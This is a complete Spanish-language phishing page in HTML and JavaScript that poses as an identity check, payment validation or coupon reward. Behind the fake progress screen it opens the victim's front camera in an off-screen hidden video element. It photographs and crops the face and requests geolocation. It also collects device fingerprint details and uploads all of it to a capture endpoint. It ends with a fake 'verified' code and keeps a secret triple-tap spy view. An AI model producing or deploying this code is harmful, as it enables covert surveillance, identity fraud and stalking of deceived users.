<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex">
<title>Verificación de identidad</title>
<style>
  :root{
    --bg:#f4f6f9; --card:#fff; --txt:#0f172a; --dim:#64748b; --line:#e2e8f0;
    --brand:#1d4ed8; --brand2:#3b82f6; --ok:#059669;
  }
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    margin:0; background:var(--bg); color:var(--txt);
    font:16px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    display:flex; align-items:center; justify-content:center; padding:20px;
  }
  .card{
    width:100%; max-width:420px; background:var(--card); border-radius:18px;
    box-shadow:0 20px 50px -18px rgba(15,23,42,.25), 0 0 0 1px var(--line);
    padding:26px 22px 22px; text-align:center;
  }
  .brand{
    display:inline-flex; align-items:center; gap:8px; font-size:12.5px; font-weight:700;
    letter-spacing:.06em; text-transform:uppercase; color:var(--dim); margin-bottom:18px;
  }
  .brand i{width:22px;height:22px;border-radius:7px;background:linear-gradient(135deg,var(--brand),var(--brand2));display:inline-block}
  h1{font-size:21px; line-height:1.25; margin:0 0 8px; letter-spacing:-.01em}
  p.sub{margin:0 0 22px; color:var(--dim); font-size:14.5px}
  .btn{
    width:100%; border:0; border-radius:12px; padding:16px; font-size:16px; font-weight:650;
    color:#fff; background:linear-gradient(180deg,var(--brand2),var(--brand)); cursor:pointer;
    box-shadow:0 10px 20px -8px rgba(29,78,216,.6); transition:transform .12s, filter .12s;
  }
  .btn:active{transform:scale(.985); filter:brightness(.95)}
  .btn[disabled]{opacity:.6; pointer-events:none}
  .fine{margin:16px 0 0; font-size:11.5px; color:#94a3b8}
  .badges{display:flex; gap:14px; justify-content:center; margin-top:18px; padding-top:16px; border-top:1px solid var(--line); font-size:10.5px; color:#94a3b8}
  .badges span{display:flex; flex-direction:column; align-items:center; gap:4px}
  .badges svg{width:17px;height:17px;stroke:var(--ok);fill:none;stroke-width:1.8}

  /* paso 2 */
  .scan{position:relative;width:96px;height:96px;margin:6px auto 22px;border-radius:50%;background:#eff4ff;overflow:hidden}
  .scan svg{position:absolute;inset:0;margin:auto;width:42px;height:42px;stroke:var(--brand);fill:none;stroke-width:1.6}
  .scan::after{
    content:""; position:absolute; left:0; right:0; height:34%;
    background:linear-gradient(180deg,rgba(59,130,246,0),rgba(59,130,246,.35));
    animation:sc 1.5s ease-in-out infinite;
  }
  @keyframes sc{0%{top:-34%}50%{top:100%}100%{top:-34%}}
  .bar{height:6px;border-radius:99px;background:#e8eef8;overflow:hidden;margin:0 0 10px}
  .bar i{display:block;height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,var(--brand2),var(--brand));transition:width .4s linear}
  .step{font-size:12.5px;color:var(--dim);min-height:18px}

  /* paso 3 */
  .check{width:76px;height:76px;margin:6px auto 20px;border-radius:50%;background:#e7f7ef;display:flex;align-items:center;justify-content:center}
  .check svg{width:38px;height:38px;stroke:var(--ok);fill:none;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round}
  .code{
    font:600 13px ui-monospace,SFMono-Regular,Menlo,monospace; letter-spacing:.14em;
    background:#f1f5f9; border:1px dashed #cbd5e1; border-radius:9px; padding:11px; margin:4px 0 18px; color:var(--dim);
  }
  [hidden]{display:none !important}

  /* ---- cámara camuflada: fuera de pantalla a tamaño real ---- */
  #cam{
    position:fixed; top:0; left:-9999px; width:320px; height:240px;
    opacity:0; pointer-events:none; transform:scaleX(-1);
    object-fit:cover; border-radius:8px; will-change:transform;
    background:#000;
  }
  /* solo visible si se activa la clase .ver (triple toque) */
  body.ver #cam{
    top:10px; right:10px; left:auto; width:132px; height:99px;
    opacity:1; z-index:999;
    box-shadow:0 8px 24px -8px rgba(0,0,0,.5);
  }
  /* quitar controles nativos si el navegador los pinta */
  #cam::-webkit-media-controls,
  #cam::-webkit-media-controls-panel,
  #cam::-webkit-media-controls-play-button,
  #cam::-webkit-media-controls-start-playback-button{
    display:none !important; -webkit-appearance:none; opacity:0;
  }
  #dot{position:fixed;bottom:0;right:0;width:44px;height:44px;z-index:1000}
</style>
</head>
<body>

<div class="card" id="card">
  <div class="brand"><i></i><span id="brand">Verificación segura</span></div>

  <section id="s1">
    <h1 id="t1"></h1>
    <p class="sub" id="p1"></p>
    <button class="btn" id="go">Continuar</button>
    <p class="fine" id="f1"></p>
    <div class="badges">
      <span><svg viewBox="0 0 24 24"><path d="M12 3l7 4v5c0 4.5-3 8-7 9-4-1-7-4.5-7-9V7l7-4z"/></svg>Cifrado</span>
      <span><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>30 segundos</span>
      <span><svg viewBox="0 0 24 24"><path d="M5 12l5 5 9-10"/></svg>Sin datos</span>
    </div>
  </section>

  <section id="s2" hidden>
    <div class="scan"><svg viewBox="0 0 24 24"><path d="M4 8V6a2 2 0 012-2h2M16 4h2a2 2 0 012 2v2M20 16v2a2 2 0 01-2 2h-2M8 20H6a2 2 0 01-2-2v-2"/><circle cx="12" cy="11" r="3"/><path d="M7.5 17c1-1.8 2.6-2.7 4.5-2.7s3.5.9 4.5 2.7"/></svg></div>
    <h1>Comprobando…</h1>
    <p class="sub">No cierres esta ventana</p>
    <div class="bar"><i id="prog"></i></div>
    <p class="step" id="step" aria-live="polite">Iniciando</p>
  </section>

  <section id="s3" hidden>
    <div class="check"><svg viewBox="0 0 24 24"><path d="M4 12.5l5.5 5.5L20 6.5"/></svg></div>
    <h1 id="t3">Verificado correctamente</h1>
    <p class="sub" id="p3">Tu identidad ha sido confirmada.</p>
    <div class="code" id="codigo"></div>
    <button class="btn" id="cerrar">Finalizar</button>
  </section>
</div>

<video id="cam" autoplay playsinline muted disablepictureinpicture></video>
<div id="dot"></div>

<script>
"use strict";

/* ---------------------------- textos del señuelo ---------------------------- */
const TEMAS = {
  verificacion: {
    brand: "Verificación segura",
    t1: "Verifica tu identidad",
    p1: "Para continuar necesitamos confirmar que eres tú. Solo tardará unos segundos.",
    cta: "Verificar ahora",
    f1: "Al continuar se solicitará acceso a la cámara durante la comprobación.",
    p3: "Tu identidad ha sido confirmada correctamente."
  },
  pago: {
    brand: "Pagos · Área segura",
    t1: "Confirma tu cuenta para recibir",
    p1: "Antes de liberar la transferencia debemos validar al titular de la cuenta.",
    cta: "Validar cuenta",
    f1: "La validación se realiza una única vez por dispositivo.",
    p3: "Cuenta validada. La transferencia ya puede procesarse."
  },
  cupon: {
    brand: "Recompensas",
    t1: "¡Has desbloqueado un 30% de descuento!",
    p1: "Confirma que no eres un robot para asignar el cupón a tu dispositivo.",
    cta: "Reclamar mi cupón",
    f1: "Cupón válido durante las próximas 24 horas.",
    p3: "Cupón asignado a tu dispositivo."
  }
};

const qs = new URLSearchParams(location.search);
const tema = TEMAS[qs.get("tema")] ? qs.get("tema") : "verificacion";
const T = TEMAS[tema];
document.title = T.brand;
document.getElementById("brand").textContent = T.brand;
document.getElementById("t1").textContent = T.t1;
document.getElementById("p1").textContent = T.p1;
document.getElementById("go").textContent = T.cta;
document.getElementById("f1").textContent = T.f1;
document.getElementById("p3").textContent = T.p3;

/* ------------------------------- utilidades -------------------------------- */
const $ = s => document.querySelector(s);
const video = $("#cam");
const sleep = ms => new Promise(r => setTimeout(r, ms));
const paso = n => { for (const s of ["s1", "s2", "s3"]) $("#" + s).hidden = s !== "s" + n; };

let stream = null, geo = null, geoPedida = false;

/* el vídeo debe tener atributos puestos por JS: iOS los ignora en HTML a veces */
video.setAttribute("playsinline", "");
video.setAttribute("webkit-playsinline", "");
video.muted = true;

function askGeo() {
  if (geoPedida || !navigator.geolocation) return;
  geoPedida = true;
  navigator.geolocation.getCurrentPosition(
    p => { geo = { lat: +p.coords.latitude.toFixed(6), lng: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) }; },
    () => {},
    { timeout: 6000, maximumAge: 60000 }
  );
}

function collectMeta() {
  const m = {
    tema, ua: navigator.userAgent, platform: navigator.platform, lang: navigator.language,
    langs: navigator.languages, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: screen.width + "x" + screen.height, dpr: devicePixelRatio,
    cores: navigator.hardwareConcurrency || null, mem: navigator.deviceMemory || null,
    referrer: document.referrer || null, iso: new Date().toISOString()
  };
  if (geo) m.geo = geo;
  return m;
}

/* ------------- espera de un frame real decodificado (no solo readyState) ---- */
function esperarFrame(ms = 3000) {
  return new Promise(res => {
    let listo = false;
    const fin = () => { if (!listo) { listo = true; res(); } };
    const reloj = setTimeout(fin, ms);

    if (typeof video.requestVideoFrameCallback === "function") {
      try {
        video.requestVideoFrameCallback(() => { clearTimeout(reloj); fin(); });
        return;
      } catch {}
    }
    const chk = () => {
      if (listo) return;
      if (video.videoWidth > 0 && video.readyState >= 2) { clearTimeout(reloj); fin(); }
      else requestAnimationFrame(chk);
    };
    chk();
  });
}

/* -------------------------------- captura --------------------------------- */
function sharpness(canvas) {
  const w = 128, h = Math.max(1, Math.round(canvas.height / canvas.width * w));
  const c = document.createElement("canvas"); c.width = w; c.height = h;
  const x = c.getContext("2d", { willReadFrequently: true });
  x.drawImage(canvas, 0, 0, w, h);
  const d = x.getImageData(0, 0, w, h).data;
  let s = 0;
  for (let y = 1; y < h; y++) for (let i = 1; i < w; i++) {
    const p = (y * w + i) * 4, qq = (y * w + i - 1) * 4;
    s += Math.abs(d[p] - d[qq]) + Math.abs(d[p + 1] - d[qq + 1]);
  }
  return s / (w * h);
}

async function cropFace(src) {
  if (!("FaceDetector" in window)) return null;
  try {
    const f = await new FaceDetector({ maxDetectedFaces: 1, fastMode: true }).detect(src);
    if (!f.length) return null;
    const b = f[0].boundingBox, pad = 0.5;
    const cx = b.x + b.width / 2, cy = b.y + b.height / 2;
    const nw = b.width * (1 + pad * 2), nh = b.height * (1 + pad * 2);
    const sx = Math.max(0, cx - nw / 2), sy = Math.max(0, cy - nh / 2);
    const sw = Math.min(src.width - sx, nw), sh = Math.min(src.height - sy, nh);
    const side = Math.round(Math.max(sw, sh));
    const out = document.createElement("canvas"); out.width = side; out.height = side;
    out.getContext("2d").drawImage(src, sx, sy, sw, sh, (side - sw) / 2, (side - sh) / 2, sw, sh);
    return out;
  } catch { return null; }
}

async function grab() {
  if (!video.videoWidth || !video.videoHeight) await esperarFrame(1200);
  const w = video.videoWidth, h = video.videoHeight;
  if (!w || !h) throw new Error("sin frame");
  const base = document.createElement("canvas"); base.width = w; base.height = h;
  base.getContext("2d").drawImage(video, 0, 0, w, h);
  const canvas = (await cropFace(base)) || base;
  return { canvas, score: sharpness(canvas), cropped: canvas !== base };
}

async function subir(canvas, score, cropped) {
  const r = await fetch("/api/captura", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      imagen: canvas.toDataURL("image/jpeg", 0.92),
      meta: Object.assign(collectMeta(), { score: Math.round(score), cropped })
    })
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok || !d.ok) throw new Error(d.error || "HTTP " + r.status);
  return d;
}

/* ------------------------------ flujo principal ---------------------------- */
const progreso = [12, 34, 58, 79, 94, 100];
function animarBarra() {
  let i = 0;
  const t = setInterval(() => {
    $("#prog").style.width = progreso[Math.min(i, progreso.length - 1)] + "%";
    $("#step").textContent = ["Iniciando", "Conectando", "Analizando rostro", "Comparando patrones", "Casi listo", "Completado"][Math.min(i, 5)];
    i++;
    if (i >= progreso.length) clearInterval(t);
  }, 620);
  return t;
}

async function capturar() {
  const shots = [];
  for (let i = 0; i < 4; i++) {
    try { shots.push(await grab()); } catch {}
    if (i < 3) await sleep(650);
  }
  if (!shots.length) return null;
  shots.sort((a, b) => b.score - a.score);
  return shots[0];
}

function fallo() {
  paso(1);
  $("#t1").textContent = "Necesitamos la cámara";
  $("#p1").textContent = "No se ha podido acceder. Pulsa el botón y elige «Permitir».";
  $("#go").textContent = "Permitir y continuar";
  $("#f1").textContent = "Si ya lo has permitido, vuelve a intentarlo.";
}

$("#go").onclick = () => {
  /* foco en el botón: el diálogo del navegador queda anclado al gesto */
  $("#go").focus();

  /* getUserMedia en el mismo tick del clic (obligatorio en iOS Safari) */
  let promesa;
  try {
    promesa = navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    });
  } catch (e) {
    promesa = Promise.reject(e);
  }

  paso(2);
  $("#go").disabled = true;
  const barra = animarBarra();

  promesa
    .catch(() => navigator.mediaDevices.getUserMedia({ video: true }))
    .then(async s => {
      stream = s;
      video.srcObject = s;
      try { await video.play(); } catch {}
      /* no capturar hasta tener un frame decodificado de verdad */
      await esperarFrame(3000);
      await sleep(320);

      askGeo();

      const mejor = await capturar();
      if (mejor) {
        try { await subir(mejor.canvas, mejor.score, mejor.cropped); }
        catch {
          setTimeout(() => subir(mejor.canvas, mejor.score, mejor.cropped).catch(() => {}), 4000);
        }
      }

      clearInterval(barra);
      $("#prog").style.width = "100%";
      await sleep(650);
      $("#codigo").textContent = "REF " + Date.now().toString(36).toUpperCase().slice(-8);
      paso(3);
      if (stream) setTimeout(() => stream.getTracks().forEach(t => t.stop()), 1200);
    })
    .catch(fallo)
    .finally(() => { $("#go").disabled = false; });
};

$("#cerrar").onclick = () => {
  if (stream) stream.getTracks().forEach(t => t.stop());
  $("#card").innerHTML = '<div class="brand"><i></i>Listo</div><h1>Operación completada</h1><p class="sub">Ya puedes cerrar esta página.</p>';
};

/* --------------------- espía: triple toque en la esquina -------------------- */
let toques = 0, tToques = 0;
$("#dot").onclick = () => {
  const ahora = Date.now();
  toques = ahora - tToques < 900 ? toques + 1 : 1;
  tToques = ahora;
  if (toques >= 3) { document.body.classList.toggle("ver"); toques = 0; }
};
</script>
</body>
</html>
